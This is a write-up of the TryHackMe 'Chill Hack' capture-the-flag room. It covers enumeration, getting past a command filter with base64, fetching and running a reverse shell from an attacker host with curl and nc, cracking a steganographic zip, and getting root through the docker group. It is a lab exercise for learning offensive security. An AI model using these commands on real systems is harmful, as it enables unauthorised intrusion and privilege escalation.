# **Description**

Hello hackers, I hope you are doing well. We are doing [Chill Hack](https://tryhackme.com/room/chillhack) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```Terminal
map scan report for 10.10.102.48 (10.10.102.48)

Found 3 open ports

## FTP

From the nmap scan, we see that ftp allows anonymous login.

![](1.png)

Found *note.txt* file, and downloaded it with `get note.txt`.

## Web

Let's navigate to the webpage.

![](2.png)

Nothing interesting, let's run a gobuster scan.

## Gobuster.

We run a directory scan with the following command. `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.10/`

```Terminal

===============================================================
```

Found a directory called **/secret**.

![](3.png)

It seems that we can execute command, let's try running a command like `ls`.

![](4.png)

Wow. The note we found earlier had the following: `Anurodh told me that there is some filtering on strings being put in the command -- Apaar`. So there is a command filter, that's why we can't run `ls`. Let's try another command.

![](5.png)

I run the command `whoami` and got `www-data` as a result.

If i tried to printout the `/etc/passwd` file i get blocked.

We can try the command `base64` to encode the content of the file and decode it later.

![](6.png)

We managed to get the encoded content, now let's decode using [cyberchef](https://gchq.github.io/CyberChef/)

![](7.png)

Great! Now we can see every user in the system.

Next, let's print the `index.php` file of the command execution page in order to see the filters.

![](8.png)

![](9.png)

We can see every word that is being filtered. We can see that the `curl` command is not black listed, so we can try to upload a reverse shell.


# **Foothold**

First, let's make our reverse shell payload.

![](10.png)

Now setup an http server using python: `python3 -m http.server 80` in the same directory of the file. 

Next go to the command execution page and run `curl http://{attacker_ip}/shell.sh -o /tmp/shell.sh`. This command will upload our shell to the target system and pur it in /tmp directory since it is world writable.

Now set up a listener on the attacker machine with `nc -lvnp 1234`

Back to the command execution page and run `bash</tmp/shell.sh`

If we go back to the listener we setup we should have received a reverse shell.

![](11.png)

I used the python pty trick to stabilize my shell.

# **Privilege Escalation**

## Anurodh

Pocking around the files in the machine, i found the following file.

![](12.png)

We got a message saying we need to "Look in the dark! You will find your answer".

The file attached to this message is "hacker-with-laptop_23-2147985341.jpg", and it is located in "/var/www/files/images/".

![](13.png)

Let's download the file to our machine and investigate it.

We need to setup a http server with python.

![](14.png)

And download the file with the following command: `wget http://10.10.102.48:8000/hacker-with-laptop_23-2147985341.jpg`

![](15.png)

Let's see if there is any hidden file in this image. We can use a tool called `stegseek` to do that.

![](16.png)

Great! There is a backup.zip file. Let's unzip it and see what's there.

![](17.png)

We need a password to unzip the file. Let's use `zip2john` to get a hash and crack the latter for a password.

![](18.png)

We got the password, now let's unzip the file.

![](19.png)

We got a file named `source_code.php`, let's see what it holds.

![](20.png)

We got a base64 encoded password and the username `Anurodh`. Let's decode the password and login to *Anurodh* account.

![](21.png)

Great! I managed to login to Anurodh account via ssh.

## Root

Run the command `id`.

![](22.png)

We that the user *anurodh* is in docker group, let's visit [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell)

![](23.png)

We can run the command `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` and become root.
